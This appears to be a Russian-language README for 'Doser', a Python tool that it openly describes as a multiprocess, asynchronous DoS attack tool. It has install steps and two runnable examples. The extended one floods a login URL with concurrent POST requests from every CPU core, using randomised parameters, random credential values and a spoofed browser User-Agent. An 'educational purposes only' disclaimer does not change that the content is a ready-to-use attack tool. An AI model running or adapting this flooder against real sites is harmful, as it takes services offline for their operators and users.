# Doser

>Автор не несет ответственности за негативные последствия, полученные
в результате использования данного репозитория. Весь код представлен
исключительно в образовательных целях!

Doser — многопроцессорный + асинхронный инструмент для DoS-атак.

## Установка зависимостей

```bash
pip install -r requirements.txt
```

## Минимальный пуск

```python
from dos import Doser
import multiprocessing as mp


if __name__ == '__main__':
    mp.freeze_support()

    try:
        Doser().start('https://example.com')
    except KeyboardInterrupt:
        print('\n- Aborted -')
```

## Расширенный пуск

```python
from dos import Doser, AlwaysRandomValue
from aiohttp import ClientResponse
import multiprocessing as mp
import string, time


_TIMEOUT_SEC = 7

def _url_format_callback(url: str, *_: any) -> str:
    return url.format(AlwaysRandomValue((2225, 2700), extra_chars=' ')())

async def _response_callback(response: ClientResponse, i: int, pid: int) -> None:
    pass

def _main(cpu_count: int) -> None:
    Doser(
        process_count=cpu_count,
        async_request_count=150
    ).start(
        url='https://example.com/login/?option={}',
        method='POST',
        timeout_sec=_TIMEOUT_SEC,
        url_format_callback=_url_format_callback,
        response_callback=_response_callback,
        allow_redirects=False,
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
        },
        data={
            'login': AlwaysRandomValue(12, string.digits),
            'password': AlwaysRandomValue((9, 15)),
        },
        cookies={
            'name': 'value'
        }
    )

if __name__ == '__main__':
    mp.freeze_support()

    try:
        cpu_count = mp.cpu_count()

        print(f'- CPU count: {cpu_count} -\n')
        time.sleep(2)

        _main(cpu_count)
    except KeyboardInterrupt:
        print('\n- Aborted -')
```

## Протестирован на

- Windows 11
- [Python v3.11.4](https://www.python.org/downloads)
